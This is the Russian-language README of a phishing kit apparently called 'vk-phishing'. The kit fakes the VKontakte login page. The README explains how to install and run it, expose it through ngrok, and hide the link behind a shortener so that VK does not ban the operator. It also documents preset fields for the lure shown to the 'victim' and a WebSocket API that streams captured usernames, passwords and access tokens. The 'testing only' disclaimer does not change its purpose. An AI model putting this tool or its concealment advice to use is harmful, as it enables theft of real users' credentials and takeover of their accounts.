# Отказ от ответственности

Эта утилита предназначена ТОЛЬКО ДЛЯ тестирования. Всю ответственность за её использование вы берёте на себя.

## Установка

Для начала скачайте и установите [node js и npm](https://nodejs.org/en/download/) если не сделали этого ранее.

1. Затем откройте страничку [релизов](https://github.com/xxhax-team/vk-phishing/releases)

2. Скачайте последний релиз

3. Распакуйте его в папку

4. Откройте эту папку в CMD/Командной строке или в терминале

5. Выполните там следующие команды:

```bash
# Установка зависимостей и сборка
npm install
# или yarn install

# Запуск приложения
npm start
```

6. После успешного запуска вы увидите что-то подобное:

```bash
ℹ Listening public url: https://blah.eu.ngrok.io
ℹ Shorten url is: https://vk.cc/bRuH
```

#### Важное

1. Для конфигурации социальной части редактируйте файл `config/aye-kosmonavt.yml`

2. Не распространяйте public url ВКонтакте, они могут вас забанить за такое. Вместо этого используйте короткую ссылку (shorten url)

## Конфигурация

### Ngrok

Файл настроек ngrok находится по пути `config/ngrok.yml`. Поддерживаются только глобальный опции (не для тоннелей отдельно).

Подробнее читайте на официальном сайте [ngrok](https://ngrok.com/docs#config)

### АУЕ Космонавт

Документацию по нему можно прочитать [на github](https://github.com/xxhax-team/aye-kosmonavt-api#readme)

Здесь он использован только для сокрытие ссылок, о нём можно больше узнать в телеграмм канале [@xxhaxteam_ayekosmonavt_leaks](https://t.me/xxhaxteam_ayekosmonavt_leaks)

Как уже было написано, его конфигурация хранится в файле `config/aye-kosmonavt.yml`. Вы можете создать несколько пресетов для вашего удобства с помощью директивы `presets` и выбирать один из них с помощью директивы `use`.

Каждый может содержать следующие поля:

1.  `beforeLoginTitle` - Заголовок ссылки, отправляемой жертве

2.  `beforeLoginImage` - Картинка, которая будет показана на фоне страницы переадресации

3.  `beforeLoginSocialImage` - ака `OgImage`, будет использована социальными сетями как превью картинка к ссылке

4.  `beforeLoginRedirTime` - Время переадресации пользователя со страници на фишинг в секундах (Чем меньше, тем лучше, но не 0. Так-как при 0 АУЕ Космонавт производит прямой переход на фишинг и все опции `before*` перестают иметь смысл)

5.  `afterLoginTitle` - Аналогична `beforeLoginTitle`, но отображается только после того, как пользователь авторизировался через ВК

6.  `afterLoginImage` - Аналогична `beforeLoginImage`

7.  `afterLoginUrl` - URL адрес, на который пользователь будет переадресован после входа

8.  `afterLoginRedirTime` - Аналогична `beforeLoginRedirTime`, но тут уже лучше использовать значение от 5 до 10 секунд.

## WebSocket API (основанное на Socket.io)

Список событий:

1. `user_auth_attempt`
   Вызывается на каждой попытке входа пользователя

```ts
type UserAuthAttemptEvent = {
  status: number // это аутентификационный статус*
  username: string
  password: string
}
```

\*См. `server/auth-constants.js`

2. `user_successful_auth`
   Вызывается только если вход был успешен.

```ts
type UserSuccessfulAuthEvent = {
  first_name: string;
  last_name: string;
  token: string;
} && UserAuthAttemptEvent
```

3. `ngrok_connected`
   Вызывается, когда ngrok создаёт подключение, а ауе космонавт их проксирует.

```ts
type NgrokConnectedEvent = {
  publicUrl: string
  shortUrl: string
}
```

Эти ссылки создаёт [aye-kosmonavt-api](https://npmjs.org/package/aye-kosmonavt-api)

4. `ngrok_fail_start`
   Вызывается, если соединение с ngrok прервалось

```ts
type NgrokFailStartEvent = Error
```

## Change log

**1.5.2**

- Обновлён дизайн галочки
- Удалено немного говна из документации

**1.5.0**

- Добавлено WebSocket Api
- Добавлен выбор renderer'ов (Хз зачем он, -r или --renderer, по умолчанию - static)
- Renderer'ы так-же можно выводить (-l или --list-renderers)

**1.4.2**

- Обновлён URL АУЕ Космонавта

**1.4.0**

- Обновление иконок
- Заменены некоторые стили
- Добавлены тесты

**1.3.0**

![Сравнение скорости](speed-comparison.gif)

- Удалена админка (/admin)
- Добавлен static renderer (использующий `nuxt generate`) для 2-ухкратного ускорения запуска и загрузки страницы.
